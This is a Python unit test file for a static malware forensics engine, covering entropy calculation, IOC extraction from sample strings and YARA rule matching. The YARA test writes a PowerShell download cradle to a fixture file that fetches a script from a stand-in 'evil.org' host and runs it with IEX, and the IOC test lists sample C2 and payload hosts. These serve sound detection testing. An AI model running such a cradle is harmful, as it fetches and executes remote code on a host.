"""
Unit Tests for Static Forensics, Shannon Entropy, String IOC Extraction, and YARA Matching.
"""

from pathlib import Path
from backend.app.services.static_analysis.analyzer import static_forensics_engine


def test_shannon_entropy_calculation():
    """Verify Shannon entropy mathematical bounds (0.0 to 8.0)."""
    # Identical bytes -> entropy 0
    zero_entropy = b"A" * 1000
    assert static_forensics_engine.calculate_entropy(zero_entropy) == 0.0

    # Uniform random bytes -> entropy close to 8.0
    import os
    rand_bytes = os.urandom(2048)
    entropy = static_forensics_engine.calculate_entropy(rand_bytes)
    assert 7.5 < entropy <= 8.0


def test_extract_iocs_regex():
    """Verify robust extraction of URLs, IPv4, and domains from extracted strings."""
    test_strings = [
        "Connecting to https://c2-beacon-service.net/api/v1/ping for updates",
        "Direct connection to 185.196.11.42 on port 8443",
        "Ignore local loopback 127.0.0.1 and broadcast 255.255.255.255",
        "Referencing domain threat-payload-download.xyz in registry key"
    ]
    iocs = static_forensics_engine.extract_iocs(test_strings)
    assert "https://c2-beacon-service.net/api/v1/ping" in iocs["urls"]
    assert "185.196.11.42" in iocs["ips"]
    assert "127.0.0.1" not in iocs["ips"]
    assert "threat-payload-download.xyz" in iocs["domains"]


def test_yara_rule_matching(tmp_path):
    """Verify YARA rules successfully match suspicious script download cradles."""
    if not static_forensics_engine.yara_rules:
        return

    script_sample = (
        b"$wc = New-Object Net.WebClient\n"
        b"$wc.DownloadString('http://evil.org/payload.ps1') | IEX\n"
    )
    test_file = tmp_path / "cradle_test.ps1"
    test_file.write_bytes(script_sample)

    evidence = static_forensics_engine.analyze_file(str(test_file), "cradle_test.ps1", "text/x-script")
    yara_hits = [e for e in evidence if e["category"] == "YARA"]
    assert len(yara_hits) > 0
    assert any("Script_Download_Cradle" in e["title"] for e in yara_hits)
